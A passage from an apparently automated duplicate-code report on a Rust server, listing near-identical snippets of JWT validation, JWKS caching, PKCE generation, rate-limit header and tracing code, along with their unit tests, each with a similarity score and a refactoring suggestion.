    fn extract_scopes(&self, claims: &HashMap<String, serde_json::Value>) -> Vec<String> {
        claims
            .get(&self.config.scopes_claim)
            .map(|v| match v {
                // Space-separated string (OAuth2 style)
                serde_json::Value::String(s) => {
                    s.split_whitespace().map(String::from).collect()
                }
                // Array of strings
                serde_json::Value::Array(arr) => {
                    arr.iter()
                        .filter_map(|v| v.as_str())
                        .map(String::from)
                        .collect()
                }
                _ => vec![],
            })
            .unwrap_or_default()
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 87.0% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 240

**Code:**
```
    fn extract_scopes(&self, claims: &HashMap<String, serde_json::Value>) -> Vec<String> {
        claims
            .get(&self.config.scopes_claim)
            .map(|v| match v {
                // Space-separated string (OAuth2 style)
                serde_json::Value::String(s) => {
                    s.split_whitespace().map(String::from).collect()
                }
                // Array of strings
                serde_json::Value::Array(arr) => {
                    arr.iter()
                        .filter_map(|v| v.as_str())
                        .map(String::from)
                        .collect()
                }
                _ => vec![],
            })
            .unwrap_or_default()
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 86.9% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 392

**Code:**
```
    fn create_simple_provider() -> JwtProvider {
        let config = JwtConfig {
            mode: JwtMode::Simple {
                secret: TEST_SECRET.to_string(),
            },
            issuer: "test-issuer".to_string(),
            audience: "test-audience".to_string(),
            user_id_claim: "sub".to_string(),
            scopes_claim: "scope".to_string(),
            scope_tool_mapping: HashMap::new(),
            leeway_secs: 0,
        };
        JwtProvider::new(config).unwrap()
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 86.6% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 878

**Code:**
```
    fn test_jwks_provider_creation() {
        let config = JwtConfig {
            mode: JwtMode::Jwks {
                jwks_url: "https://example.com/.well-known/jwks.json".to_string(),
                algorithms: vec!["RS256".to_string()],
                cache_duration_secs: 3600,
            },
            issuer: "https://example.com".to_string(),
            audience: "test-audience".to_string(),
            user_id_claim: "sub".to_string(),
            scopes_claim: "scope".to_string(),
            scope_tool_mapping: HashMap::new(),
            leeway_secs: 0,
        };
        
        let provider = JwtProvider::new(config);
        assert!(provider.is_ok());
        
        let provider = provider.unwrap();
        assert!(provider.jwks_cache.is_some());
        assert!(provider.http_client.is_some());
        assert!(provider.simple_key.is_none());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 86.5% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 412

**Code:**
```
    fn now_secs() -> i64 {
        SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_secs() as i64
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 86.5% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 412

**Code:**
```
    fn now_secs() -> i64 {
        SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_secs() as i64
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 86.1% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 878

**Code:**
```
    fn test_jwks_provider_creation() {
        let config = JwtConfig {
            mode: JwtMode::Jwks {
                jwks_url: "https://example.com/.well-known/jwks.json".to_string(),
                algorithms: vec!["RS256".to_string()],
                cache_duration_secs: 3600,
            },
            issuer: "https://example.com".to_string(),
            audience: "test-audience".to_string(),
            user_id_claim: "sub".to_string(),
            scopes_claim: "scope".to_string(),
            scope_tool_mapping: HashMap::new(),
            leeway_secs: 0,
        };
        
        let provider = JwtProvider::new(config);
        assert!(provider.is_ok());
        
        let provider = provider.unwrap();
        assert!(provider.jwks_cache.is_some());
        assert!(provider.http_client.is_some());
        assert!(provider.simple_key.is_none());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 85.9% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 49

**Code:**
```
    fn new(cache_duration: Duration) -> Self {
        Self {
            keys: HashMap::new(),
            fetched_at: Instant::now() - cache_duration - Duration::from_secs(1), // Start expired
            cache_duration,
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 85.9% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 878

**Code:**
```
    fn test_jwks_provider_creation() {
        let config = JwtConfig {
            mode: JwtMode::Jwks {
                jwks_url: "https://example.com/.well-known/jwks.json".to_string(),
                algorithms: vec!["RS256".to_string()],
                cache_duration_secs: 3600,
            },
            issuer: "https://example.com".to_string(),
            audience: "test-audience".to_string(),
            user_id_claim: "sub".to_string(),
            scopes_claim: "scope".to_string(),
            scope_tool_mapping: HashMap::new(),
            leeway_secs: 0,
        };
        
        let provider = JwtProvider::new(config);
        assert!(provider.is_ok());
        
        let provider = provider.unwrap();
        assert!(provider.jwks_cache.is_some());
        assert!(provider.http_client.is_some());
        assert!(provider.simple_key.is_none());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 85.5% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 878

**Code:**
```
    fn test_jwks_provider_creation() {
        let config = JwtConfig {
            mode: JwtMode::Jwks {
                jwks_url: "https://example.com/.well-known/jwks.json".to_string(),
                algorithms: vec!["RS256".to_string()],
                cache_duration_secs: 3600,
            },
            issuer: "https://example.com".to_string(),
            audience: "test-audience".to_string(),
            user_id_claim: "sub".to_string(),
            scopes_claim: "scope".to_string(),
            scope_tool_mapping: HashMap::new(),
            leeway_secs: 0,
        };
        
        let provider = JwtProvider::new(config);
        assert!(provider.is_ok());
        
        let provider = provider.unwrap();
        assert!(provider.jwks_cache.is_some());
        assert!(provider.http_client.is_some());
        assert!(provider.simple_key.is_none());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 85.1% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 412

**Code:**
```
    fn now_secs() -> i64 {
        SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_secs() as i64
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 84.8% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 392

**Code:**
```
    fn create_simple_provider() -> JwtProvider {
        let config = JwtConfig {
            mode: JwtMode::Simple {
                secret: TEST_SECRET.to_string(),
            },
            issuer: "test-issuer".to_string(),
            audience: "test-audience".to_string(),
            user_id_claim: "sub".to_string(),
            scopes_claim: "scope".to_string(),
            scope_tool_mapping: HashMap::new(),
            leeway_secs: 0,
        };
        JwtProvider::new(config).unwrap()
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 84.8% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 867

**Code:**
```
    fn test_jwks_cache_not_expired_within_duration() {
        let mut cache = JwksCache::new(Duration::from_secs(3600));
        cache.fetched_at = Instant::now();
        assert!(!cache.is_expired());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 84.4% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 856

**Code:**
```
    fn test_jwks_cache_is_expired_after_duration() {
        let mut cache = JwksCache::new(Duration::from_millis(1));
        cache.fetched_at = Instant::now();
        // Should not be expired immediately
        assert!(!cache.is_expired());
        // Wait for expiry
        std::thread::sleep(Duration::from_millis(5));
        assert!(cache.is_expired());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 84.3% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 231

**Code:**
```
    fn build_validation(&self, algorithm: Algorithm) -> Validation {
        let mut validation = Validation::new(algorithm);
        validation.set_issuer(&[&self.config.issuer]);
        validation.set_audience(&[&self.config.audience]);
        validation.leeway = self.config.leeway_secs;
        validation
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 84.2% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 49

**Code:**
```
    fn new(cache_duration: Duration) -> Self {
        Self {
            keys: HashMap::new(),
            fetched_at: Instant::now() - cache_duration - Duration::from_secs(1), // Start expired
            cache_duration,
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 84.2% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 950

**Code:**
```
    fn test_extract_scopes_with_non_standard_value() {
        let provider = create_simple_provider();
        
        // Test with number value (should return empty)
        let mut claims = HashMap::new();
        claims.insert("scope".to_string(), serde_json::json!(123));
        let scopes = provider.extract_scopes(&claims);
        assert!(scopes.is_empty());
        
        // Test with object value (should return empty)
        let mut claims = HashMap::new();
        claims.insert("scope".to_string(), serde_json::json!({"nested": "value"}));
        let scopes = provider.extract_scopes(&claims);
        assert!(scopes.is_empty());
        
        // Test with missing scope claim (should return empty)
        let claims: HashMap<String, serde_json::Value> = HashMap::new();
        let scopes = provider.extract_scopes(&claims);
        assert!(scopes.is_empty());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 84.2% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 972

**Code:**
```
    fn test_extract_scopes_empty_string() {
        let provider = create_simple_provider();
        
        let mut claims = HashMap::new();
        claims.insert("scope".to_string(), serde_json::json!(""));
        let scopes = provider.extract_scopes(&claims);
        assert!(scopes.is_empty());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 83.9% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 848

**Code:**
```
    fn test_jwks_cache_new_starts_expired() {
        let cache = JwksCache::new(Duration::from_secs(3600));
        // Cache should start expired to trigger immediate refresh
        assert!(cache.is_expired());
        assert!(cache.keys.is_empty());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 83.7% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 856

**Code:**
```
    fn test_jwks_cache_is_expired_after_duration() {
        let mut cache = JwksCache::new(Duration::from_millis(1));
        cache.fetched_at = Instant::now();
        // Should not be expired immediately
        assert!(!cache.is_expired());
        // Wait for expiry
        std::thread::sleep(Duration::from_millis(5));
        assert!(cache.is_expired());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 83.3% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 836

**Code:**
```
    fn test_parse_algorithm_unknown() {
        assert_eq!(parse_algorithm("PS256"), None);
        assert_eq!(parse_algorithm("unknown"), None);
        assert_eq!(parse_algorithm(""), None);
        assert_eq!(parse_algorithm("rs256"), None); // Case sensitive
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 83.2% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 856

**Code:**
```
    fn test_jwks_cache_is_expired_after_duration() {
        let mut cache = JwksCache::new(Duration::from_millis(1));
        cache.fetched_at = Instant::now();
        // Should not be expired immediately
        assert!(!cache.is_expired());
        // Wait for expiry
        std::thread::sleep(Duration::from_millis(5));
        assert!(cache.is_expired());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 81.8% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 867

**Code:**
```
    fn test_jwks_cache_not_expired_within_duration() {
        let mut cache = JwksCache::new(Duration::from_secs(3600));
        cache.fetched_at = Instant::now();
        assert!(!cache.is_expired());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 81.6% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 816

**Code:**
```
    fn test_parse_algorithm_rs_variants() {
        assert_eq!(parse_algorithm("RS256"), Some(Algorithm::RS256));
        assert_eq!(parse_algorithm("RS384"), Some(Algorithm::RS384));
        assert_eq!(parse_algorithm("RS512"), Some(Algorithm::RS512));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 81.6% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 823

**Code:**
```
    fn test_parse_algorithm_hs_variants() {
        assert_eq!(parse_algorithm("HS256"), Some(Algorithm::HS256));
        assert_eq!(parse_algorithm("HS384"), Some(Algorithm::HS384));
        assert_eq!(parse_algorithm("HS512"), Some(Algorithm::HS512));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 81.4% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 369

**Code:**
```
fn parse_algorithm(alg: &str) -> Option<Algorithm> {
    match alg {
        "HS256" => Some(Algorithm::HS256),
        "HS384" => Some(Algorithm::HS384),
        "HS512" => Some(Algorithm::HS512),
        "RS256" => Some(Algorithm::RS256),
        "RS384" => Some(Algorithm::RS384),
        "RS512" => Some(Algorithm::RS512),
        "ES256" => Some(Algorithm::ES256),
        "ES384" => Some(Algorithm::ES384),
        _ => None,
    }
}
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 81.1% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 856

**Code:**
```
    fn test_jwks_cache_is_expired_after_duration() {
        let mut cache = JwksCache::new(Duration::from_millis(1));
        cache.fetched_at = Instant::now();
        // Should not be expired immediately
        assert!(!cache.is_expired());
        // Wait for expiry
        std::thread::sleep(Duration::from_millis(5));
        assert!(cache.is_expired());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 81.0% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 950

**Code:**
```
    fn test_extract_scopes_with_non_standard_value() {
        let provider = create_simple_provider();
        
        // Test with number value (should return empty)
        let mut claims = HashMap::new();
        claims.insert("scope".to_string(), serde_json::json!(123));
        let scopes = provider.extract_scopes(&claims);
        assert!(scopes.is_empty());
        
        // Test with object value (should return empty)
        let mut claims = HashMap::new();
        claims.insert("scope".to_string(), serde_json::json!({"nested": "value"}));
        let scopes = provider.extract_scopes(&claims);
        assert!(scopes.is_empty());
        
        // Test with missing scope claim (should return empty)
        let claims: HashMap<String, serde_json::Value> = HashMap::new();
        let scopes = provider.extract_scopes(&claims);
        assert!(scopes.is_empty());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 80.7% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 240

**Code:**
```
    fn extract_scopes(&self, claims: &HashMap<String, serde_json::Value>) -> Vec<String> {
        claims
            .get(&self.config.scopes_claim)
            .map(|v| match v {
                // Space-separated string (OAuth2 style)
                serde_json::Value::String(s) => {
                    s.split_whitespace().map(String::from).collect()
                }
                // Array of strings
                serde_json::Value::Array(arr) => {
                    arr.iter()
                        .filter_map(|v| v.as_str())
                        .map(String::from)
                        .collect()
                }
                _ => vec![],
            })
            .unwrap_or_default()
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 80.3% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 369

**Code:**
```
fn parse_algorithm(alg: &str) -> Option<Algorithm> {
    match alg {
        "HS256" => Some(Algorithm::HS256),
        "HS384" => Some(Algorithm::HS384),
        "HS512" => Some(Algorithm::HS512),
        "RS256" => Some(Algorithm::RS256),
        "RS384" => Some(Algorithm::RS384),
        "RS512" => Some(Algorithm::RS512),
        "ES256" => Some(Algorithm::ES256),
        "ES384" => Some(Algorithm::ES384),
        _ => None,
    }
}
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 80.2% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 231

**Code:**
```
    fn build_validation(&self, algorithm: Algorithm) -> Validation {
        let mut validation = Validation::new(algorithm);
        validation.set_issuer(&[&self.config.issuer]);
        validation.set_audience(&[&self.config.audience]);
        validation.leeway = self.config.leeway_secs;
        validation
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.9% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1643

**Code:**
```
    fn test_add_rate_limit_headers() {
        use axum::body::Body;
        use crate::rate_limit::RateLimitResult;
        
        let mut response = Response::new(Body::empty());
        let rate_limit = RateLimitResult {
            allowed: true,
            limit: 100,
            remaining: 95,
            reset_at: 1700000000,
            retry_after_secs: None,
        };
        
        add_rate_limit_headers_from_result(&mut response, &rate_limit);
        
        assert_eq!(
            response.headers().get("x-ratelimit-limit").unwrap(),
            "100"
        );
        assert_eq!(
            response.headers().get("x-ratelimit-remaining").unwrap(),
            "95"
        );
        assert_eq!(
            response.headers().get("x-ratelimit-reset").unwrap(),
            "1700000000"
        );
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.8% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1376

**Code:**
```
    fn test_pkce_consistency() {
        // Verify that verifier and challenge are correctly related
        use sha2::{Digest, Sha256};
        
        let (verifier, challenge) = generate_pkce();
        
        // Manually compute expected challenge
        let mut hasher = Sha256::new();
        hasher.update(verifier.as_bytes());
        let hash = hasher.finalize();
        let expected_challenge = base64::Engine::encode(
            &base64::engine::general_purpose::URL_SAFE_NO_PAD,
            hash,
        );
        
        assert_eq!(challenge, expected_challenge);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.8% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1287

**Code:**
```
    fn test_app_error_rate_limited() {
        let err = AppError::rate_limited(Some(5));
        match err.kind {
            AppErrorKind::RateLimited { retry_after_secs, .. } => {
                assert_eq!(retry_after_secs, Some(5));
            }
            _ => panic!("Expected RateLimited"),
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.8% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1673

**Code:**
```
    fn test_add_rate_limit_headers_zero_remaining() {
        use axum::body::Body;
        use crate::rate_limit::RateLimitResult;
        
        let mut response = Response::new(Body::empty());
        let rate_limit = RateLimitResult {
            allowed: false,
            limit: 100,
            remaining: 0,
            reset_at: 1700000060,
            retry_after_secs: Some(60),
        };
        
        add_rate_limit_headers_from_result(&mut response, &rate_limit);
        
        assert_eq!(
            response.headers().get("x-ratelimit-remaining").unwrap(),
            "0"
        );
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.7% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 424

**Code:**
```
fn generate_pkce() -> (String, String) {
    use sha2::{Digest, Sha256};

    // Generate a random 43-128 character code verifier
    let code_verifier = generate_random_string(64);

    // Create SHA-256 hash and base64url encode it
    let mut hasher = Sha256::new();
    hasher.update(code_verifier.as_bytes());
    let hash = hasher.finalize();
    let code_challenge = base64::Engine::encode(
        &base64::engine::general_purpose::URL_SAFE_NO_PAD,
        hash,
    );

    (code_verifier, code_challenge)
}
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.7% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1358

**Code:**
```
    fn test_generate_random_string() {
        let s1 = generate_random_string(32);
        let s2 = generate_random_string(32);
        assert_eq!(s1.len(), 32);
        assert_eq!(s2.len(), 32);
        assert_ne!(s1, s2); // Should be different each time
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.7% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1401

**Code:**
```
    fn test_cleanup_expired_oauth_states() {
        let store = new_oauth_state_store();

        // Add a fresh state with client IP binding
        store.insert("fresh".to_string(), PkceState {
            code_verifier: "verifier".to_string(),
            created_at: Instant::now(),
            client_ip: "127.0.0.1".parse().unwrap(),
        });

        // Cleanup should keep fresh state
        cleanup_expired_oauth_states(&store);
        assert!(store.contains_key("fresh"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.6% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1643

**Code:**
```
    fn test_add_rate_limit_headers() {
        use axum::body::Body;
        use crate::rate_limit::RateLimitResult;
        
        let mut response = Response::new(Body::empty());
        let rate_limit = RateLimitResult {
            allowed: true,
            limit: 100,
            remaining: 95,
            reset_at: 1700000000,
            retry_after_secs: None,
        };
        
        add_rate_limit_headers_from_result(&mut response, &rate_limit);
        
        assert_eq!(
            response.headers().get("x-ratelimit-limit").unwrap(),
            "100"
        );
        assert_eq!(
            response.headers().get("x-ratelimit-remaining").unwrap(),
            "95"
        );
        assert_eq!(
            response.headers().get("x-ratelimit-reset").unwrap(),
            "1700000000"
        );
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.5% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1503

**Code:**
```
    fn test_ready_response_not_ready() {
        let response = ReadyResponse {
            ready: false,
            version: "1.0.0",
            reason: Some("Transport not initialized".to_string()),
        };
        let json = serde_json::to_string(&response).unwrap();
        assert!(json.contains("false"));
        assert!(json.contains("Transport not initialized"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.4% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1287

**Code:**
```
    fn test_app_error_rate_limited() {
        let err = AppError::rate_limited(Some(5));
        match err.kind {
            AppErrorKind::RateLimited { retry_after_secs, .. } => {
                assert_eq!(retry_after_secs, Some(5));
            }
            _ => panic!("Expected RateLimited"),
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.4% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1583

**Code:**
```
    fn test_header_injector() {
        use opentelemetry::propagation::Injector;
        
        let mut headers = HeaderMap::new();
        {
            let mut injector = HeaderInjector(&mut headers);
            injector.set("x-trace-id", "12345".to_string());
        }
        
        assert_eq!(headers.get("x-trace-id").unwrap(), "12345");
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.4% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1583

**Code:**
```
    fn test_header_injector() {
        use opentelemetry::propagation::Injector;
        
        let mut headers = HeaderMap::new();
        {
            let mut injector = HeaderInjector(&mut headers);
            injector.set("x-trace-id", "12345".to_string());
        }
        
        assert_eq!(headers.get("x-trace-id").unwrap(), "12345");
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.4% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1571

**Code:**
```
    fn test_header_extractor_keys() {
        let mut headers = HeaderMap::new();
        headers.insert("x-custom", HeaderValue::from_static("value"));
        headers.insert("content-type", HeaderValue::from_static("application/json"));
        
        let extractor = HeaderExtractor(&headers);
        let keys = extractor.keys();
        assert!(keys.contains(&"x-custom"));
        assert!(keys.contains(&"content-type"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.3% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1287

**Code:**
```
    fn test_app_error_rate_limited() {
        let err = AppError::rate_limited(Some(5));
        match err.kind {
            AppErrorKind::RateLimited { retry_after_secs, .. } => {
                assert_eq!(retry_after_secs, Some(5));
            }
            _ => panic!("Expected RateLimited"),
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.1% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1471

**Code:**
```
    fn test_health_response_serialization() {
        let response = HealthResponse {
            status: "healthy",
            version: "1.0.0",
            uptime_secs: 100,
        };
        let json = serde_json::to_string(&response).unwrap();
        assert!(json.contains("healthy"));
        assert!(json.contains("1.0.0"));
        assert!(json.contains("100"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.1% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1561

**Code:**
```
    fn test_header_extractor() {
        let mut headers = HeaderMap::new();
        headers.insert("traceparent", HeaderValue::from_static("00-abc-def-01"));
        
        let extractor = HeaderExtractor(&headers);
        assert_eq!(extractor.get("traceparent"), Some("00-abc-def-01"));
        assert_eq!(extractor.get("missing"), None);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.1% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 424

**Code:**
```
fn generate_pkce() -> (String, String) {
    use sha2::{Digest, Sha256};

    // Generate a random 43-128 character code verifier
    let code_verifier = generate_random_string(64);

    // Create SHA-256 hash and base64url encode it
    let mut hasher = Sha256::new();
    hasher.update(code_verifier.as_bytes());
    let hash = hasher.finalize();
    let code_challenge = base64::Engine::encode(
        &base64::engine::general_purpose::URL_SAFE_NO_PAD,
        hash,
    );

    (code_verifier, code_challenge)
}
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.0% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1367

**Code:**
```
    fn test_generate_pkce() {
        let (verifier, challenge) = generate_pkce();
        assert_eq!(verifier.len(), 64);
        assert!(!challenge.is_empty());
        // Challenge should be base64url encoded SHA-256 (43 chars without padding)
        assert_eq!(challenge.len(), 43);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.0% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1401

**Code:**
```
    fn test_cleanup_expired_oauth_states() {
        let store = new_oauth_state_store();

        // Add a fresh state with client IP binding
        store.insert("fresh".to_string(), PkceState {
            code_verifier: "verifier".to_string(),
            created_at: Instant::now(),
            client_ip: "127.0.0.1".parse().unwrap(),
        });

        // Cleanup should keep fresh state
        cleanup_expired_oauth_states(&store);
        assert!(store.contains_key("fresh"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.0% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1376

**Code:**
```
    fn test_pkce_consistency() {
        // Verify that verifier and challenge are correctly related
        use sha2::{Digest, Sha256};
        
        let (verifier, challenge) = generate_pkce();
        
        // Manually compute expected challenge
        let mut hasher = Sha256::new();
        hasher.update(verifier.as_bytes());
        let hash = hasher.finalize();
        let expected_challenge = base64::Engine::encode(
            &base64::engine::general_purpose::URL_SAFE_NO_PAD,
            hash,
        );
        
        assert_eq!(challenge, expected_challenge);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 93.9% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1401

**Code:**
```
    fn test_cleanup_expired_oauth_states() {
        let store = new_oauth_state_store();

        // Add a fresh state with client IP binding
        store.insert("fresh".to_string(), PkceState {
            code_verifier: "verifier".to_string(),
            created_at: Instant::now(),
            client_ip: "127.0.0.1".parse().unwrap(),
        });

        // Cleanup should keep fresh state
        cleanup_expired_oauth_states(&store);
        assert!(store.contains_key("fresh"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 93.9% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1571

**Code:**
```
    fn test_header_extractor_keys() {
        let mut headers = HeaderMap::new();
        headers.insert("x-custom", HeaderValue::from_static("value"));
        headers.insert("content-type", HeaderValue::from_static("application/json"));
        
        let extractor = HeaderExtractor(&headers);
        let keys = extractor.keys();
        assert!(keys.contains(&"x-custom"));
        assert!(keys.contains(&"content-type"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 93.9% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1571

**Code:**
```
    fn test_header_extractor_keys() {
        let mut headers = HeaderMap::new();
        headers.insert("x-custom", HeaderValue::from_static("value"));
        headers.insert("content-type", HeaderValue::from_static("application/json"));
        
        let extractor = HeaderExtractor(&headers);
        let keys = extractor.keys();
        assert!(keys.contains(&"x-custom"));
        assert!(keys.contains(&"content-type"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 93.5% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 424

**Code:**
```
fn generate_pkce() -> (String, String) {
    use sha2::{Digest, Sha256};

    // Generate a random 43-128 character code verifier
    let code_verifier = generate_random_string(64);

    // Create SHA-256 hash and base64url encode it
    let mut hasher = Sha256::new();
    hasher.update(code_verifier.as_bytes());
    let hash = hasher.finalize();
    let code_challenge = base64::Engine::encode(
        &base64::engine::general_purpose::URL_SAFE_NO_PAD,
        hash,
    );

    (code_verifier, code_challenge)
}
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 93.5% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1491

**Code:**
```
    fn test_ready_response_ready() {
        let response = ReadyResponse {
            ready: true,
            version: "1.0.0",
            reason: None,
        };
        let json = serde_json::to_string(&response).unwrap();
        assert!(json.contains("true"));
        assert!(!json.contains("reason")); // Should be skipped when None
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 93.4% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1561

**Code:**
```
    fn test_header_extractor() {
        let mut headers = HeaderMap::new();
        headers.insert("traceparent", HeaderValue::from_static("00-abc-def-01"));
        
        let extractor = HeaderExtractor(&headers);
        assert_eq!(extractor.get("traceparent"), Some("00-abc-def-01"));
        assert_eq!(extractor.get("missing"), None);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 93.4% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1367

**Code:**
```
    fn test_generate_pkce() {
        let (verifier, challenge) = generate_pkce();
        assert_eq!(verifier.len(), 64);
        assert!(!challenge.is_empty());
        // Challenge should be base64url encoded SHA-256 (43 chars without padding)
        assert_eq!(challenge.len(), 43);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 93.3% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1401

**Code:**
```
    fn test_cleanup_expired_oauth_states() {
        let store = new_oauth_state_store();

        // Add a fresh state with client IP binding
        store.insert("fresh".to_string(), PkceState {
            code_verifier: "verifier".to_string(),
            created_at: Instant::now(),
            client_ip: "127.0.0.1".parse().unwrap(),
        });

        // Cleanup should keep fresh state
        cleanup_expired_oauth_states(&store);
        assert!(store.contains_key("fresh"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 93.3% similarity.

- **File:** `src/server/mod.rs`
- **Line:** 1699

**Code:**
```
    fn test_pkce_state_ip_binding() {
        let store = new_oauth_state_store();
        
